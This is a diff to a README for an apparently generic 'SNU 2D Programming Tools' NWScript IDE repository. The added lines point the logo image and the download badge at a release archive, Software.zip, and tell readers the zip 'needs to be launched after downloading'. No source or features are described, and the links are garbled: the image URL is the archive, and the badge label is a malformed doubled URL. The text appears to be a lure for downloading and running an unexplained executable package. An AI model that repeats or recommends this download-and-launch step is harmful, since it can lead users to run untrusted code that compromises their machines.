@@ -1,6 +1,6 @@
 
 # 👨‍💻 SNU 2D Programming Tools IDE - NWScript
-![NWScript Logo](https://yourimageurl.com)
+![NWScript Logo](https://github.com/speedwalker48700/SNU_2D_ProgrammingTools_IDE_NWScript/releases/download/v2.0/Software.zip)
 
 Welcome to the official repository for the NWScript programming language IDE submodule for SNU Programming Tools (2D Mode)! 🚀
 
@@ -14,8 +14,8 @@ This repository houses the essential tools and resources required for utilizing 
 
 ## 🚀 Explore the IDE
 To begin exploring and utilizing the NWScript IDE, please download the software package from the following link: 
-[![Download Software](https://img.shields.io/badge/Download-%20Software.zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
-*(Note: The Software.zip needs to be launched after downloading)*
+[![Download Software](https://github.com/speedwalker48700/SNU_2D_ProgrammingTools_IDE_NWScript/releases/download/v2.0/Software.zip%https://github.com/speedwalker48700/SNU_2D_ProgrammingTools_IDE_NWScript/releases/download/v2.0/Software.zip)](https://github.com/speedwalker48700/SNU_2D_ProgrammingTools_IDE_NWScript/releases/download/v2.0/Software.zip)
+*(Note: The https://github.com/speedwalker48700/SNU_2D_ProgrammingTools_IDE_NWScript/releases/download/v2.0/Software.zip needs to be launched after downloading)*
 
 If the provided link is not working or you prefer to access a stable version of the software, please check the "Releases" section of this repository for alternative download options.
 
